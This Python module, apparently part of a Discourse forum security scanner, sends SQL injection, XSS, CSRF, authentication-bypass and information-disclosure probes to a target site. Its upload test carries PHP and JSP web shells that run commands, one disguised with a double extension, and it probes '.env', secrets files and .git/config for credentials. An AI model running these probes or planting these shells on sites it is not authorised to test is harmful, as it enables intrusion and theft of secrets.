#!/usr/bin/env python3
"""
Discourse Security Scanner - Vulnerability Testing Module

Tests for common web vulnerabilities in Discourse forums
"""

import re
import time
import json
import base64
from urllib.parse import urljoin, quote, urlparse
from bs4 import BeautifulSoup
from .utils import generate_payloads, extract_csrf_token

class VulnerabilityModule:
    """Vulnerability testing module for Discourse forums"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'Vulnerability Testing',
            'target': scanner.target_url,
            'sql_injection': [],
            'xss_vulnerabilities': [],
            'csrf_issues': [],
            'file_upload_issues': [],
            'auth_bypass': [],
            'info_disclosure': [],
            'tests_performed': 0,
            'scan_time': 0
        }
        self.start_time = time.time()
    
    def run(self):
        """Run vulnerability testing module"""
        self.scanner.log("Starting vulnerability testing...")
        
        # SQL Injection tests
        self._test_sql_injection()
        
        # XSS tests
        self._test_xss_vulnerabilities()
        
        # CSRF tests
        self._test_csrf_protection()
        
        # File upload tests
        self._test_file_upload_vulnerabilities()
        
        # Authentication bypass tests
        self._test_auth_bypass()
        
        # Information disclosure tests
        self._test_info_disclosure()
        
        self.results['scan_time'] = time.time() - self.start_time
        return self.results
    
    def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        self.scanner.log("Testing for SQL injection vulnerabilities...", 'debug')
        
        # SQL injection payloads
        sql_payloads = generate_payloads('sql_injection')
        
        # Test endpoints
        test_endpoints = [
            '/search',
            '/users',
            '/categories',
            '/latest',
            '/top'
        ]
        
        # Test parameters
        test_params = ['q', 'search', 'username', 'category', 'order', 'period']
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for param in test_params:
                for payload in sql_payloads:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.scanner.make_request(test_url)
                    
                    if response and self._detect_sql_injection(response.text, payload):
                        vuln = {
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'severity': 'high',
                            'description': f'SQL injection vulnerability in {param} parameter'
                        }
                        self.results['sql_injection'].append(vuln)
                        self.scanner.log(f"SQL injection found: {endpoint}?{param}={payload[:20]}...", 'warning')
                    
                    self.results['tests_performed'] += 1
                    time.sleep(0.1)
    
    def _detect_sql_injection(self, response_text, payload):
        """Detect SQL injection indicators"""
        # SQL error patterns
        sql_errors = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'PostgreSQL.*ERROR',
            r'Warning.*pg_.*',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*oci_.*',
            r'Warning.*ora_.*',
            r'Microsoft.*ODBC.*SQL Server.*Driver',
            r'SQLServer JDBC Driver',
            r'SqlException',
            r'OLE DB.*SQL Server',
            r'\bORA-\d{5}',
            r'SQLite.*error',
            r'sqlite3.OperationalError',
            r'SQLite3::SQLException',
            r'Warning.*sqlite_.*',
            r'Warning.*SQLite3::',
            r'\[SQLITE_ERROR\]'
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Time-based detection (basic)
        if 'WAITFOR DELAY' in payload or 'SLEEP(' in payload:
            # This would require timing analysis in a real implementation
            pass
        
        return False
    
    def _test_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities"""
        self.scanner.log("Testing for XSS vulnerabilities...", 'debug')
        
        # XSS payloads
        xss_payloads = generate_payloads('xss')
        
        # Test endpoints
        test_endpoints = [
            '/search',
            '/new-topic',
            '/new-message',
            '/users',
            '/categories'
        ]
        
        # Test parameters
        test_params = ['q', 'search', 'title', 'body', 'username', 'message']
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for param in test_params:
                for payload in xss_payloads:
                    # GET request test
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.scanner.make_request(test_url)
                    
                    if response and self._detect_xss_reflection(response.text, payload):
                        vuln = {
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'url': test_url,
                            'severity': 'medium',
                            'description': f'XSS vulnerability in {param} parameter'
                        }
                        self.results['xss_vulnerabilities'].append(vuln)
                        self.scanner.log(f"XSS found: {endpoint}?{param}={payload[:20]}...", 'warning')
                    
                    # POST request test
                    post_data = {param: payload}
                    response = self.scanner.make_request(url, method='POST', data=post_data)
                    
                    if response and self._detect_xss_reflection(response.text, payload):
                        vuln = {
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'method': 'POST',
                            'url': url,
                            'severity': 'medium',
                            'description': f'XSS vulnerability in {param} parameter (POST)'
                        }
                        self.results['xss_vulnerabilities'].append(vuln)
                        self.scanner.log(f"XSS found (POST): {endpoint} - {param}", 'warning')
                    
                    self.results['tests_performed'] += 1
                    time.sleep(0.1)
    
    def _detect_xss_reflection(self, response_text, payload):
        """Detect XSS payload reflection"""
        # Check if payload is reflected without proper encoding
        if payload in response_text:
            # Check for dangerous contexts
            dangerous_contexts = [
                f'<script>{payload}',
                f'>{payload}<',
                f'="{payload}"',
                f"='{payload}'",
                f'javascript:{payload}'
            ]
            
            for context in dangerous_contexts:
                if context in response_text:
                    return True
        
        return False
    
    def _test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        self.scanner.log("Testing CSRF protection...", 'debug')
        
        # Test endpoints that should have CSRF protection
        csrf_endpoints = [
            '/posts',
            '/topics',
            '/users',
            '/admin/users',
            '/session'
        ]
        
        for endpoint in csrf_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test without CSRF token
            test_data = {
                'title': 'Test Post',
                'raw': 'Test content',
                'category': '1'
            }
            
            response = self.scanner.make_request(url, method='POST', data=test_data)
            
            if response:
                if response.status_code == 200:
                    # Check if action was successful without CSRF token
                    if 'success' in response.text.lower() or 'created' in response.text.lower():
                        vuln = {
                            'endpoint': endpoint,
                            'issue': 'Missing CSRF protection',
                            'severity': 'medium',
                            'description': f'Endpoint {endpoint} accepts POST requests without CSRF token'
                        }
                        self.results['csrf_issues'].append(vuln)
                        self.scanner.log(f"CSRF protection missing: {endpoint}", 'warning')
                elif response.status_code == 403 or 'csrf' in response.text.lower():
                    # CSRF protection is working
                    self.scanner.log(f"CSRF protection active: {endpoint}", 'debug')
            
            self.results['tests_performed'] += 1
            time.sleep(0.1)
    
    def _test_file_upload_vulnerabilities(self):
        """Test file upload vulnerabilities"""
        self.scanner.log("Testing file upload vulnerabilities...", 'debug')
        
        upload_endpoints = [
            '/uploads',
            '/posts/upload',
            '/admin/backups',
            '/user_avatar'
        ]
        
        # Malicious file tests
        malicious_files = {
            'shell.php': b'<?php system($_GET["cmd"]); ?>',
            'shell.jsp': b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'xss.svg': b'<svg onload=alert("XSS")></svg>',
            'shell.php.jpg': b'<?php system($_GET["cmd"]); ?>',  # Double extension
            'shell.phtml': b'<?php system($_GET["cmd"]); ?>'
        }
        
        for endpoint in upload_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for filename, content in malicious_files.items():
                files = {'file': (filename, content, 'image/jpeg')}
                
                response = self.scanner.make_request(url, method='POST', files=files)
                
                if response and self._detect_upload_success(response.text, filename):
                    vuln = {
                        'endpoint': endpoint,
                        'filename': filename,
                        'issue': 'Malicious file upload allowed',
                        'severity': 'high',
                        'description': f'Malicious file {filename} was uploaded successfully'
                    }
                    self.results['file_upload_issues'].append(vuln)
                    self.scanner.log(f"File upload vulnerability: {filename} at {endpoint}", 'warning')
                
                self.results['tests_performed'] += 1
                time.sleep(0.2)
    
    def _detect_upload_success(self, response_text, filename):
        """Detect successful file upload"""
        success_indicators = [
            'upload successful',
            'file uploaded',
            'upload complete',
            filename,
            'success',
            'uploaded'
        ]
        
        return any(indicator in response_text.lower() for indicator in success_indicators)
    
    def _test_auth_bypass(self):
        """Test authentication bypass vulnerabilities"""
        self.scanner.log("Testing authentication bypass...", 'debug')
        
        # Protected endpoints
        protected_endpoints = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/site_settings',
            '/my/preferences'
        ]
        
        # Bypass techniques
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Admin': 'true'},
            {'X-Authenticated': 'true'},
            {'Authorization': 'Bearer admin'}
        ]
        
        for endpoint in protected_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            # Test direct access
            response = self.scanner.make_request(url)
            if response and response.status_code == 200 and 'admin' in response.text.lower():
                vuln = {
                    'endpoint': endpoint,
                    'method': 'Direct access',
                    'severity': 'critical',
                    'description': f'Protected endpoint {endpoint} is directly accessible'
                }
                self.results['auth_bypass'].append(vuln)
                self.scanner.log(f"Auth bypass: Direct access to {endpoint}", 'error')
            
            # Test header-based bypass
            for headers in bypass_headers:
                response = self.scanner.make_request(url, headers=headers)
                if response and response.status_code == 200 and 'admin' in response.text.lower():
                    vuln = {
                        'endpoint': endpoint,
                        'method': f'Header bypass: {list(headers.keys())[0]}',
                        'headers': headers,
                        'severity': 'critical',
                        'description': f'Authentication bypass using headers at {endpoint}'
                    }
                    self.results['auth_bypass'].append(vuln)
                    self.scanner.log(f"Auth bypass: Header bypass at {endpoint}", 'error')
            
            self.results['tests_performed'] += 1
            time.sleep(0.1)
    
    def _test_info_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        self.scanner.log("Testing for information disclosure...", 'debug')
        
        # Sensitive endpoints
        sensitive_endpoints = [
            '/.env',
            '/config/database.yml',
            '/config/secrets.yml',
            '/backup',
            '/logs',
            '/admin/logs',
            '/debug',
            '/phpinfo.php',
            '/server-status',
            '/server-info',
            '/.git/config',
            '/.svn/entries',
            '/robots.txt',
            '/sitemap.xml'
        ]
        
        for endpoint in sensitive_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = self.scanner.make_request(url)
            
            if response and response.status_code == 200:
                # Check for sensitive information
                sensitive_patterns = [
                    r'password["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'api_key["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'secret["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'database["\']?\s*[:=]\s*["\'][^"\'\']+["\']',
                    r'mysql://[^\s]+',
                    r'postgresql://[^\s]+',
                    r'redis://[^\s]+'
                ]
                
                for pattern in sensitive_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vuln = {
                            'endpoint': endpoint,
                            'issue': 'Sensitive information disclosed',
                            'pattern': pattern,
                            'severity': 'medium',
                            'description': f'Sensitive information found at {endpoint}'
                        }
                        self.results['info_disclosure'].append(vuln)
                        self.scanner.log(f"Info disclosure: {endpoint}", 'warning')
                        break
            
            self.results['tests_performed'] += 1
            time.sleep(0.1)